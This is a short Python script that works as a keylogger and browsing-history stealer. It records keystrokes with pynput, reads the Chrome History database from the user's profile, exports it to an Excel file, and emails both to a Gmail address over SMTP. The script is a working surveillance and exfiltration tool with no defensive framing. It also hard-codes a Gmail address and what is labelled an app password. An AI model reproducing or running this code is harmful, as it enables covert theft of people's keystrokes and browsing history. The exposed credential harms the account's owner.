from pynput.keyboard import Key, Listener
import sqlite3
import pandas as pd
import io
import os
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

# Global variable to control the script
running = False
k = []
last_key = None

# Function to send email
def send_email(subject, body, to_email, attachment_data=[]):
    from_email = "vrishankvmistry@gmail.com"  # Your Gmail email address
    password = "vjgbmxxuwdgbjxkj"  # Your Gmail app password
    
    msg = MIMEMultipart()
    msg['From'] = from_email
    msg['To'] = to_email
    msg['Subject'] = subject

    msg.attach(MIMEText(body, 'plain'))

    for attachment_name, attachment_content in attachment_data:
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(attachment_content)
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f"attachment; filename= {attachment_name}")
        msg.attach(part)

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(from_email, password)
    text = msg.as_string()
    server.sendmail(from_email, to_email, text)
    server.quit()

# Your existing code
def start():
    global running
    running = True

    home_dir = os.path.expanduser("~")
    history_path = os.path.join(home_dir, r'AppData\Local\Google\Chrome\User Data\Default\History')
    conn = sqlite3.connect(history_path)
    cursor = conn.cursor()
    cursor.execute("SELECT url, title, datetime((last_visit_time/1000000)-11644473600, 'unixepoch', 'localtime') AS last_visit_time FROM urls")
    search_history = cursor.fetchall()
    df = pd.DataFrame(search_history, columns=['url', 'title', 'Timestamp'])
    excel_data = io.BytesIO()
    df.to_excel(excel_data, index=False)
    excel_data.seek(0)

    def on_press(key):
        global last_key
        if not running or key == last_key:
            return False
        last_key = key
        k.append(key)
        print(key)

    def on_release(key):
        if key == Key.esc or not running:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

def stop():
    global running, k
    running = False
    home_dir = os.path.expanduser("~")
    history_path = os.path.join(home_dir, r'AppData\Local\Google\Chrome\User Data\Default\History')
    conn = sqlite3.connect(history_path)
    cursor = conn.cursor()
    cursor.execute("SELECT url, title, datetime((last_visit_time/1000000)-11644473600, 'unixepoch', 'localtime') AS last_visit_time FROM urls")
    search_history = cursor.fetchall()
    df = pd.DataFrame(search_history, columns=['url', 'title', 'Timestamp'])
    excel_data = io.BytesIO()
    df.to_excel(excel_data, index=False)
    excel_data.seek(0)
    send_email("Search History and Key Logs", "Please find the attached files.", "vrishankvmistry@gmail.com", [("FFML.txt", ''.join(map(str, k))), ("FML.xlsx", excel_data.getvalue())])
